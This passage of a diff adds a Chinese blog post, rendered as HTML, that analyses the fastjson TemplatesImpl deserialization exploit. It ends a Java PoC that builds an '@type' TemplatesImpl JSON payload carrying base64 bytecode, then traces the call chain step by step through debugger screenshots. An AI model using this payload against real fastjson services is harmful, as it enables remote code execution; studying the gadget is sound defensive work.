+</span><span class="c1"></span>        <span class="n">String</span> <span class="n">randomClassName</span> <span class="o">=</span> <span class="s">&#34;LaLa&#34;</span><span class="o">+</span><span class="n">System</span><span class="o">.</span><span class="na">nanoTime</span><span class="o">();</span>
+        <span class="n">cc</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">randomClassName</span><span class="o">);</span>
+        <span class="c1">//设置满足条件的父类
+</span><span class="c1"></span>        <span class="n">cc</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">((</span><span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">())));</span>
+        <span class="c1">//获取字节码
+</span><span class="c1"></span>        <span class="kt">byte</span><span class="o">[]</span> <span class="n">lalaByteCodes</span> <span class="o">=</span> <span class="n">cc</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+
+        <span class="k">return</span> <span class="n">lalaByteCodes</span><span class="o">;</span>
+    <span class="o">}</span>
+    <span class="c1">//生成payload，触发payload
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span>  <span class="nf">poc</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="c1">//生成攻击payload
+</span><span class="c1"></span>        <span class="kt">byte</span><span class="o">[]</span> <span class="n">evilCode</span> <span class="o">=</span> <span class="n">getevilbyte</span><span class="o">();</span><span class="c1">//生成恶意类的字节码
+</span><span class="c1"></span>        <span class="n">String</span> <span class="n">evilCode_base64</span> <span class="o">=</span> <span class="n">Base64</span><span class="o">.</span><span class="na">encodeBase64String</span><span class="o">(</span><span class="n">evilCode</span><span class="o">);</span><span class="c1">//使用base64封装
+</span><span class="c1"></span>        <span class="kd">final</span> <span class="n">String</span> <span class="n">NASTY_CLASS</span> <span class="o">=</span> <span class="s">&#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#34;</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">text1</span> <span class="o">=</span> <span class="s">&#34;{&#34;</span><span class="o">+</span>
+                <span class="s">&#34;\&#34;@type\&#34;:\&#34;&#34;</span> <span class="o">+</span> <span class="n">NASTY_CLASS</span> <span class="o">+</span><span class="s">&#34;\&#34;,&#34;</span><span class="o">+</span>
+                <span class="s">&#34;\&#34;_bytecodes\&#34;:[\&#34;&#34;</span><span class="o">+</span><span class="n">evilCode_base64</span><span class="o">+</span><span class="s">&#34;\&#34;],&#34;</span><span class="o">+</span>
+                <span class="s">&#34;&#39;_name&#39;:&#39;a.b&#39;,&#34;</span><span class="o">+</span>
+                <span class="s">&#34;&#39;_tfactory&#39;:{ },&#34;</span><span class="o">+</span>
+                <span class="s">&#34;&#39;_outputProperties&#39;:{ }&#34;</span><span class="o">+</span>
+                <span class="s">&#34;}\n&#34;</span><span class="o">;</span>
+        <span class="c1">//此处删除了一些我觉得没有用的参数（第二个_name，_version，allowedProtocols），并没有发现有什么影响
+</span><span class="c1"></span>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">text1</span><span class="o">);</span>
+        <span class="c1">//服务端触发payload
+</span><span class="c1"></span>        <span class="n">ParserConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ParserConfig</span><span class="o">();</span>
+        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">text1</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">config</span><span class="o">,</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SupportNonPublicField</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="c1">//main函数调用以下poc而已
+</span><span class="c1"></span>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[]){</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">poc</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>先摆出调用栈</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110212327862.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110212327862"
+	
+	
+></p>
+<p>我们直接从parseObject开始分析，这里实例化了一个DefaultJSONParser，把input也就是我们的payload载入了，然后执行了他的<code>parseObject</code>方法</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110011553857.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110011553857"
+	
+	
+></p>
+<p>跟进DefaultJSONParser的parseObject，return了一个JavaObjectDeserializer的deserialze方法，把本类传入，也就自带了我们的payload进去</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110012743319.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110012743319"
+	
+	
+></p>
+<p>继续跟进，这里执行了一个三元运算符，里面有个点是触发DefaultJSONParser的parser方法，但是要求前面的判断为false，这里有一个点是<code>type != Object.class</code></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110014236401.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110014236401"
+	
+	
+></p>
+<p>而回到我们的POC里，可以看到我们确实赋值了第二个参数为Object.class（第二个参数最后会传递成这里的type</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">text1</span><span class="o">,</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">config</span><span class="o">,</span> <span class="n">Feature</span><span class="o">.</span><span class="na">SupportNonPublicField</span><span class="o">);</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>那么我们就能如愿回到DefaultJSONParser进入parser方法</p>
+<p>在这个方法之前，我们先看看一个变量<code>lexer</code>，由于我们传入的json数据，所以这里<code>lexer.token</code>会被赋值为12</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110094938467.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110094938467"
+	
+	
+></p>
+<p>再去parser方法里看，由于我们的token为12，所以走进这里，调用parseObject</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110103738659.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110103738659"
+	
+	
+></p>
+<p>跟进parseObject，他会识别<code>@type</code>，然后提取出我们输入的 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>，作为变量clazz</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110200509212.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110200509212"
+	
+	
+></p>
+<p>这里再执行了一个<code>getDeserializer</code>并且把clazz传入</p>
+<p><img src="/Library/Application%20Support/typora-user-images/image-20221110193543512.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110193543512"
+	
+	
+></p>
+<p>这里跟进去<code>getDeserializer</code>，调用重载</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110200015703.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110200015703"
+	
+	
+></p>
+<p>继续往下走，调用到了一个<code>createJavaBeanDeserializer</code></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110200631918.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110200631918"
+	
+	
+></p>
+<p>继续往下走，调用了<code>JavaBeanInfo.build</code>，clazz和type持续传递中</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110200836734.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110200836734"
+	
+	
+></p>
+<p>这里就到了一个循环里面，循环获取他的setXxxx方法，可以看到如果以<code>_</code>开头，他会有所处理，这就和前面说的fastjson的特性一样</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110201114961.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110201114961"
+	
+	
+></p>
+<p>这里是一样的，循环获取getXxxx</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110201257789.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110201257789"
+	
+	
+></p>
+<p>把所有的setter和getter方法全部存入<code>fieldList</code>，最后return一个JavaBeanInfo</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110201401885.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110201401885"
+	
+	
+></p>
+<p>再回到parseObject，执行刚刚返回的deserializer的deserialza方法</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110160322020.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110160322020"
+	
+	
+></p>
+<p>重载了几次deserialze进入最终的deserialze，这里<code>Object</code>通过反射获取到TemplateImpl的实例</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110214004995.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110214004995"
+	
+	
+></p>
+<p>实例化TemplateImpl作为object</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110214234117.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110214234117"
+	
+	
+></p>
+<blockquote>
+<p>这里解释一下这个循环，他是利用了这个循环，把JSON中的每一个属性放进反序列化出来的类中，变成完整的、与JSON数据对应的类</p>
+</blockquote>
+<p>最后把参数代入，走进<code>parseField</code>方法里面</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110170126591.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110170126591"
+	
+	
+></p>
+<p>跟进parseField方法，这里实例化了一个<code>DefaultFieldDeserializer</code>，然后再执行DefaultFieldDeserializer的<code>parseField</code>方法</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110210122447.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110210122447"
+	
+	
+></p>
+<p>继续跟进DefaultFieldDeserializer的parseField方法，这里就涉及到我们TemplateImpl实例的内容了，看看他是如何一步步把数据从JSON中还原出Object</p>
+<p>这里最后执行的<code>this.fieldValueDeserilizer.deserialze</code></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110221809124.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110221809124"
+	
+	
+></p>
+<p>跟进去看，首先定义了一个空数组，然后执行了<code>parser.parseArray</code></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110222510942.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110222510942"
+	
+	
+></p>
+<p>跟进parseArray，这里执行了<code>array.add</code>，把_bytycode给加进去了，那么他add的val是怎么来的我们得跟一下前面的deserialze</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110223048907.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110223048907"
+	
+	
+></p>
+<p>进去关注到这个函数bytesValue</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110223356268.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110223356268"
+	
+	
+></p>
+<p>他会把我们的bytecode给base64解码，这也解释了我们为啥要把他base64给编码了</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110223507978.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110223507978"
+	
+	
+></p>
+<p>return了我们解码了的bytecode，然后add进数组</p>
+<p>最后再回到前面，执行<code>this.toObjectArray(parser, componentClass, array)</code></p>
+<p>这里就把bytecode给放入array了</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110224335095.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110224335095"
+	
+	
+></p>
+<p>再回去得到返回值，赋值给value</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110224523227.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110224523227"
+	
+	
+></p>
+<p>那么到最后这里就解释的通了，执行了一个<code>setValue</code>，传入的Object是<code>TemplateImpl</code>，value为我们的bytecode</p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110224939405.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110224939405"
+	
+	
+></p>
+<p>然后就到了invoke了，执行TemplateImpl的<code>getOutputProperties</code></p>
+<p><img src="https://tuchuang.huamang.xyz/img/image-20221110210439793.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20221110210439793"
+	
+	
+></p>
+<p>后面的就不多说了，直接TemplateImpl一波了</p>
+<h1 id="后记">后记</h1>
+<p>准备搓一个思维导图，先留个坑吧</p>
+<p>参考文章：</p>
+<p><a class="link" href="https://tttang.com/archive/1579/"  target="_blank" rel="noopener"
+    >https://tttang.com/archive/1579/</a></p>
+<p><a class="link" href="https://xz.aliyun.com/t/7027"  target="_blank" rel="noopener"
+    >https://xz.aliyun.com/t/7027</a></p>
+<p><a class="link" href="https://www.cnblogs.com/nice0e3/p/14601670.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/nice0e3/p/14601670.html</a></p>
 
 </section>
 
